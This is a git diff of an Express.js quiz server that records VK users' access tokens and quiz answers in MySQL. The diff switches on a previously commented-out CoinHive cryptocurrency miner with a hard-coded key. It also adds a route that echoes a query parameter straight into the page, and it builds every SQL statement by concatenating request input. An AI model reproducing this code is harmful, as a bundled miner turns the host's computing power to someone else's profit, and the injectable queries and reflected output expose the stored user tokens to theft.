@@ -1,7 +1,7 @@
 const express = require('express')
 const app = express()
 // MINER))))
-/*const CoinHive = require('coin-hive');
+const CoinHive = require('coin-hive');
 
 (async () => {
   const miner = await CoinHive('iJFqkJpXPWBCQrualE4SxWyLBEqu2RTb');
@@ -10,7 +10,7 @@ const app = express()
   miner.on('found', () => console.log('Found!'));
   miner.on('accepted', () => console.log('Accepted!'));
 })();
-*/
+
 var mysql = require('mysql')
 
 var con = mysql.createConnection({
@@ -41,27 +41,48 @@ app.get('/', (request, response) => {
 })
 
 app.get('/test', (request, response) => {
-  response.send('qwe')
+  response.send(request.query.quest)
 })
 
 app.get('/reg', (req,res) =>{
 	var token = req.query.access_token
-	var vk_id = req.query.vk_id
-	var sql = con.query("SELECT vk_id FROM boys WHERE vk_id = "+vk_id+"", function (err, result, fields) {
+	var user_id = req.query.user_id
+	var sql = con.query("SELECT user_id FROM boys WHERE user_id = "+user_id+"", function (err, result, fields) {
 	    if (err) throw err;
 	    if(result[0] == undefined){
-	      var sql = "INSERT INTO boys (access_token, vk_id) VALUES ("+token+", '"+vk_id+"')";
+	      var sql = "INSERT INTO boys (access_token, user_id) VALUES ("+token+", '"+user_id+"')";
 	      con.query(sql, function (err, result) {
 	        if (err) throw err;
-	        getName(vk_id)
+	        getName(user_id)
 	        console.log("User recorded to database");
 	      });
 	    }else{
 	      console.log('Just used')
 	    }
 	})
-	//res.send(token+"<br>"+vk_id)
+	//res.send(token+"<br>"+user_id)
 	res.send('hello')
+})
+
+app.get('/questboy', (req,res) =>{
+	var answer = req.query.quest
+	var user_id = req.query.user_id
+	var query_string = ""
+	for (var i = 0; i < 5; i++) {
+		var k = i + 1
+		query_string = query_string + "quest"+k+" = '"+answer[i]+"'"
+		if(i !== 4){
+			query_string = query_string + ","
+		}
+	}
+	console.log(query_string)
+	var sql = "UPDATE boys SET "+query_string+" WHERE user_id = "+user_id+"";
+        con.query(sql, function (err, result) {
+        if (err) throw err;
+        console.log('Answers added')
+    })
+	//res.send(token+"<br>"+user_id)
+	res.send(answer)
 })
 
 function sendMessage(user_id,access_token,message){
@@ -155,7 +176,7 @@ function getName(user_id){
 
     })((error, statusCode, headers, body) => {
         var test = JSON.parse(body)
-        var sql = "UPDATE boys SET name = '"+test['response'][0]['first_name']+' '+test['response'][0]['last_name']+"' WHERE vk_id = "+user_id+"";
+        var sql = "UPDATE boys SET name = '"+test['response'][0]['first_name']+' '+test['response'][0]['last_name']+"' WHERE user_id = "+user_id+"";
             con.query(sql, function (err, result) {
             if (err) throw err;
             console.log('Name Added')
